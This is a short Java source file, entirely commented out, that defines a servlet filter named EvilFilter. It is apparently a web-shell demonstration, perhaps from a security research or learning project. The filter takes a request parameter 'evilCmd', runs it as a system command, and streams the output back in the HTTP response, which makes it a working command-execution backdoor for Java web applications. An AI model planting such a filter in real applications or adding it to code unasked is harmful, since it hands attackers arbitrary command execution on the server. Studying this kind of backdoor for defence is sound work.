//package com.vdt;
//
//import jakarta.servlet.*;
//import jakarta.servlet.annotation.WebFilter;
//
//import java.io.IOException;
//import java.io.InputStream;
//
////@WebFilter("/hello")
//public class EvilFilter implements Filter {
//    @Override
//    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain filterChain) throws IOException, ServletException {
//        // this method is called for every request to the servlet mapped to "/hello"
//        String cmd = req.getParameter("evilCmd");
//        if (cmd != null) {
//            InputStream input = Runtime.getRuntime().exec(cmd).getInputStream();
//            ServletOutputStream output = resp.getOutputStream();
//            byte[] buffer = new byte[1024];
//            int len;
//            while ((len = input.read(buffer)) != -1) {
//                output.write(buffer, 0, len);
//            }
//            output.flush();
//            output.close(); // not allow servlet to modify the response
//        } else {
//            filterChain.doFilter(req, resp); // Continue with the next filter or servlet
//        }
//    }
//}